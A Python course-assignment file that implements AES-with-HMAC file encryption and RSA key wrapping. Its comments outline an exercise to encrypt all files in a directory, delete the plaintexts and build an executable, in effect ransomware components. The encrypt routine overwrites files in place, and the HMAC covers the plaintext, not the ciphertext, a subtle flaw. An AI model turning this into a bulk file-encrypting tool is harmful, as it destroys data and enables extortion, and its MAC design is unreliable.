# -*- coding: utf-8 -*-
"""
Created on Tue Nov  7 19:46:13 2017

@author: phala
"""
import os
import KeyManager
import Mycrypto
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding as apadding
#import mycryptographer as mycrypto

path_to_working_dir = './'
path_to_keys = './keys/'
public_key_file_name = 'public_key'
private_key_file_name = 'private_key'
key_ext = '.pem'
path_public_key_file_name = path_to_keys + public_key_file_name + key_ext
path_private_key_file_name = path_to_keys + private_key_file_name + key_ext

def MyencryptMAC(message, EncKey, HMACKey):
    C, IV = Mycrypto.Myencrypt(message, EncKey)
    h = hmac.HMAC(HMACKey, hashes.SHA256(), default_backend())
    h.update(message)
    tag = h.finalize()
    return C, IV, tag

def MydecryptMAC(C, IV, tag, EncKey, HMACKey):
    message = Mycrypto.Mydecrypt(C, EncKey, IV)
    h = hmac.HMAC(HMACKey, hashes.SHA256(), default_backend())
    h.update(message)
    h.verify(tag)
    return message

def MyfileEncryptMAC(filepath):
    EncKey = os.urandom(32)
    HMACKey = os.urandom(32)
    
    filename, ext = os.path.splitext(filepath)
    
    print('MyfileEncryptMAC\'s filepath: '+ filepath)
    with open(filepath, 'rb') as f:
        C, IV, tag = MyencryptMAC(f.read(), EncKey, HMACKey)
    
    with open(path_to_working_dir + filepath, 'wb') as f:
        f.write(C)
        
    return C, IV, tag, EncKey, HMACKey, ext

def MyfileDecryptMAC(C, IV, tag, EncKey, HMACKey, ext, file_name):
    message = MydecryptMAC(C, IV, tag, EncKey, HMACKey)
    filepath = path_to_working_dir + file_name + ext
    with open(filepath, 'wb') as f:
        f.write(message)
            
    return filepath

def MyRSAEncrypt(file_path, RSA_Publickey_filepath):
    
    C, IV, tag, EncKey, HMACKey, ext = MyfileEncryptMAC(file_path)
    
    #check if key is avaiable
    pubKey = KeyManager.GetPublicKey()
    RSACipher = pubKey.encrypt(
            EncKey+HMACKey,
            apadding.OAEP(apadding.MGF1(hashes.SHA512()),
                          hashes.SHA512(), 
                          None))
        
    return RSACipher, C, IV, tag, ext

def MyRSADecrypt(RSACipher, C, IV, tag, file_path, ext, RSA_Privatekey_filepath):
    privatekey = KeyManager.GetPrivateKey()
    file_name = os.path.splitext(file_path)[0]
    
    key = privatekey.decrypt(
            RSACipher, 
            apadding.OAEP(
                    mgf = apadding.MGF1(algorithm = hashes.SHA512()),
                    algorithm = hashes.SHA512(),
                    label = None))
    EncKey = key[0:32]
    HMACKey = key[32:64]
    message = MydecryptMAC(C, IV, tag, EncKey, HMACKey)
    
    
    with open(path_to_working_dir + file_name + ext, 'wb') as f:
        f.write(message)
            
    return file_path


#Where in the above, RSACipher includes RSA encryption of m=EncKey+ HMACKey (concatenated). 
#Make sure you implement the reverse of the above (MACVerification-then-Decrypt).
#You can use SHA256 in your HMAC.
#
#Save this class as FileEncryptMAC.
#
#Step 2:
#
#Next, you will a script that looks for a pair of RSA Public and private key (using a CONSTANT file path; PEM format). If the files do not exist (use OS package) then generate the RSA public and private key (2048 bits length) using the same constant file path.
#
#Step 3:
#
#You can use the OS package to retrieve the current working directory. Then you can get a list of all files in this directory. For each file, encrypt them using MyRSAEncrypt from your new FileEncryptMAC module. Do this in a loop for all files (make sure you do not encrypt the RSA Private Key file). For every file that is encrypted, store the encrypted file as a JSON file. The attributes you have for each file are 'RSACipher', 'C', 'IV', 'tag' and 'ext'. The values are from MyRSAEncrypt method. Once the JSON fire is written (use json.dump() with file.write() methods) into a JSON file then you can remove the plaintext file (use os.remove() method).
#
#Note: For now, you can skip encrypting files within directories in the working directories (i.e., recursive execution).
#
#Note: DO NOT test your script on any valuable file. It will be your responsibility if you lose any important data to you.
#
#Step 4:
#
#Using Pyinstaller or Py2exe create an executable file from your step 3.
#
#Do NOT run the executable file on important folders. Only test on a designated python working directory. You are responsible if you lose any important file.
    



#key = os.urandom(32)
#hkey = os.urandom(32)
#cipher, iv, t = MyencryptMAC(b'test', key, hkey)
#message = MydecryptMAC(cipher, iv, t, key, hkey)
#print(message)
#
#c, iv, tag, ekey, hkey, ext = MyfileEncryptMAC('test.txt') #takes file from root dir for now
#path = MyfileDecryptMAC(c, iv, tag, ekey, hkey, ext)
#print(working_dir + mycrypto.public_key_file_name + mycrypto.key_ext)
    
#print(path_to_keys+public_key_file_name+key_ext)
#encryptDir(path_to_keys)
#decryptDir(path_to_keys)
#rsacipher, c, iv, tag, ext = MyRSAEncrypt('test.txt', mycrypto.path_to_keys + mycrypto.public_key_file_name + mycrypto.key_ext)
#print(MyRSADecrypt(rsacipher, c, iv, tag, ext, mycrypto.path_to_keys + mycrypto.private_key_file_name + mycrypto.key_ext))
#print("here")
#print(encryptDir('public_key.pem'))
#print(decryptDir('private_key.pem'))